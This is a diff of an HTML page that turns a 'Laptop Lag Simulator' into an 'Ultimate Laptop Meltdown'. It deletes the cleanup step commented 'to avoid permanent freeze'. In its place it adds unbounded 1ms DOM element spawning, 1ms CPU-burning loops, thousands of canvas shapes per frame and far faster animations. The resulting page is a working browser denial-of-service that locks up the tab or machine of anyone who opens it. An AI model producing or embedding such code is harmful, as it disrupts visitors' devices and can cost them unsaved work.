@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Laptop Lag Simulator</title>
+  <title>Ultimate Laptop Meltdown</title>
   <style>
     * {
       margin: 0;
@@ -12,15 +12,15 @@
     }
     body {
       background: black;
-      overflow: hidden;
       color: white;
+      overflow: hidden;
       font-family: Arial, sans-serif;
     }
-    .chaos {
+    .chaotic {
       position: absolute;
-      font-size: 2rem;
+      font-size: 3rem;
       color: hsl(calc(360 * var(--hue)), 100%, 50%);
-      animation: spin 0.5s linear infinite, bounce 1s ease-in-out infinite alternate;
+      animation: spin 0.05s linear infinite, bounce 0.1s ease-in-out infinite alternate;
     }
 
     @keyframes spin {
@@ -37,7 +37,7 @@
         transform: translateY(0);
       }
       to {
-        transform: translateY(90vh);
+        transform: translateY(100vh);
       }
     }
   </style>
@@ -45,14 +45,14 @@
 <body>
   <canvas id="canvas"></canvas>
   <script>
-    // Setup the canvas for insane rendering
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
 
+    // Canvas rendering madness
     function drawShapes() {
-      for (let i = 0; i < 300; i++) {
+      for (let i = 0; i < 2000; i++) {
         ctx.beginPath();
         ctx.arc(
           Math.random() * canvas.width,
@@ -72,30 +72,24 @@
     }
     render();
 
-    // Create DOM Chaos with animated elements
+    // 1ms DOM spam with NO LIMITS
     setInterval(() => {
       const div = document.createElement('div');
-      div.textContent = '💥';
+      div.textContent = '🔥💣💥';
       div.style.left = `${Math.random() * 100}vw`;
       div.style.top = `${Math.random() * 100}vh`;
-      div.style.fontSize = `${Math.random() * 40 + 10}px`;
+      div.style.fontSize = `${Math.random() * 60 + 10}px`;
       div.style.setProperty('--hue', Math.random());
-      div.classList.add('chaos');
+      div.classList.add('chaotic');
       document.body.appendChild(div);
+    }, 1); // Infinite DOM spam at 1ms intervals
 
-      // Cleanup after 3 seconds to avoid permanent freeze
-      setTimeout(() => div.remove(), 3000);
-    }, 10);
-
-    // Heavy computation for CPU overload
-    function computeIntensive() {
+    // Brutal CPU overload
+    setInterval(() => {
       for (let i = 0; i < 1e6; i++) {
-        Math.pow(Math.random(), Math.random());
+        Math.sin(Math.random()) * Math.sqrt(i);
       }
-      requestAnimationFrame(computeIntensive);
-    }
-
-    computeIntensive();
+    }, 1); // 1ms computations
   </script>
 </body>
 </html>
